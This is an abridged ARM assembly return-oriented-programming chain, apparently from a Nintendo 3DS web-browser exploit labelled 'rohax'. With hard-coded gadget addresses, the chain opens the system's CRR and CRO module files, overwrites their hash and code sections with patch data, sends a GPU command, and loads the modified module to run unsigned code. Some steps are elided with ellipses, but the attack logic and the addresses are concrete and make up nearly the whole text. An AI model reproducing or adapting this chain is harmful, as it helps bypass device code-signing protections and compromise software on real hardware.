...
thread0rop:
	...
	;open and read static.crr
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_ADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_ADR+staticCrr_str ; r1 (path)
		...
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_ADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_ADR+tmpVar ; r1 (readbytes)
	...
	;open and read static.crs
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_ADR+fileObj+0x100 ; r0 (this)
			.word SPIDER_THREAD0ROP_ADR+staticCrs_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0022FE0C ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
	...
	;patch crr
		;copy patch
			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHEAPBUF ; r0 (dst)
				.word SPIDER_THREAD0ROP_ADR+crrPatch ; r1 (src)
		...
		;send GX command
			...
			.word 0x00228af4 ; pop {r1, pc}
				.word SPIDER_THREAD0ROP_ADR+gxCommand ; r1 (cmd addr)
	...
	;read cro
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_ADR+fileObj+0x200 ; r0 (this)
			.word SPIDER_THREAD0ROP_ADR+ossCro_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0022FE0C ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
	...
	;patch cro (0x0 patch) (hashes)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			...
			.word SPIDER_THREAD0ROP_ADR+croPatch0 ; r1 (src)
	...
	;patch cro (0x700 patch) (ro code)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			...
			.word SPIDER_THREAD0ROP_ADR+croPatch700 ; r1 (src)
	...
	;patch cro (0x2000 patch) (spider code)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			...
			.word SPIDER_THREAD0ROP_ADR+croPatch2000 ; r1 (src)
	...
	;patch cro (0x1D9020 patch) (rohax stuff)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			...
			.word SPIDER_THREAD0ROP_ADR+croPatch1D9020 ; r1 (src)
	...
	;patch cro (0x1DBA90 patch) (rohax stuff)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			...
			.word SPIDER_THREAD0ROP_ADR+croPatch1DBA90 ; r1 (src)
	...
	;load cro
		...
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_ADR+tmpVar ; r0 (outval)
